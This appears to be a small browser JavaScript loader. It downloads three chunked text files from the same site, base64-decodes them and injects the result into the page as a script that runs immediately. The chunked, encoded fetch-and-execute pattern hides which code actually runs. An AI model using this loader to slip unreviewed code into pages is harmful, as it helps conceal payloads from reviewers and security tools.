(async function(){
  const parts = [];
  for (let i = 0; i < 3; i++) {
    const r = await fetch("core-part-" + i + ".txt?t=" + Date.now());
    if (!r.ok) { console.error("core part", i, r.status); return; }
    parts.push(await r.text());
  }
  const bin = atob(parts.join(""));
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const text = new TextDecoder("utf-8").decode(bytes);
  const s = document.createElement("script");
  s.text = text;
  document.head.appendChild(s);
})();
